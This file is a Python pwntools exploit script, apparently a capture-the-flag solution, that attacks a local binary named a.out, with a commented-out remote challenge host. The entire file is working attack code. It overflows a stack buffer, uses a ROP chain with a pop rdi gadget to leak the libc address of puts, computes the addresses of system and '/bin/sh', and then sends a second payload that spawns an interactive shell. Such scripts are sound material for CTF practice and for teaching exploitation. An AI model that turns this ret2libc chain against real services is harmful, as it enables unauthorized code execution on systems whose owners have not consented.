# -*- coding: UTF-8 -*-
from pwn import *

context.log_level = 'debug'
context.terminal = ["/usr/bin/tmux","sp","-h"]

# io = remote('chuj.top', 34698) #nc chuj.top 34698
# libc = ELF('./libc-2.31.so')
io = process('a.out')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
elf = ELF('./a.out')

l64 = lambda      :u64(io.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
l32 = lambda      :u32(io.recvuntil("\x7f")[-4:].ljust(4,"\x00"))
rl = lambda	a=False		: io.recvline(a)
ru = lambda a,b=True	: io.recvuntil(a,b)
rn = lambda x			: io.recvn(x)
sn = lambda x			: io.send(x)
sl = lambda x			: io.sendline(x)
sa = lambda a,b			: io.sendafter(a,b)
sla = lambda a,b		: io.sendlineafter(a,b)
irt = lambda			: io.interactive()
dbg = lambda text=None  : gdb.attach(io, text)
lg = lambda s			: log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
uu32 = lambda data		: u32(data.ljust(4, '\x00'))
uu64 = lambda data		: u64(data.ljust(8, '\x00'))
ur64 = lambda data		: u64(data.rjust(8, '\x00'))
def add(idx,size):
	sl('1')
	sla('Index?\n',str(idx))
	sla('Size?\n',str(size))
def show(idx):
	sl('2')
	sla('Index?\n',str(idx))
	
def edit(idx,content):
	sl('3')
	sla('Index?\n',str(idx))
	sa('content:\n',content)
		
def delete(idx):
	sl('4')
	sla('Index?\n',str(idx))

# 0x0000000000401313 : pop rdi ; ret
# 404020 puts.plt
# 401260 main
pop_rdi = 0x0000000000401313
puts = elf.got['puts']
pay = 0x2c*"a" #+ p64(pop_rdi) + p64(puts) + p64(0x404020) + p64(0x401260)
pay += p8(0x37) + p64(pop_rdi) + p64(puts) + p64(elf.plt['puts']) + p64(0x401260)
dbg()
raw_input()
#sl(pay)
sl(pay)
putsaddr = l64()
lg('putsaddr')

libcbase = putsaddr - libc.sym['puts']
lg('libcbase')
system = libcbase + libc.sym['system']
lg('system')
binsh = libcbase + libc.search('/bin/sh').next()
lg('binsh')
pay = 0x2c*"a" + p8(0x37)+ p64(pop_rdi) + p64(binsh) +p64(0x40101a)+ p64(system)
sl(pay)
irt()


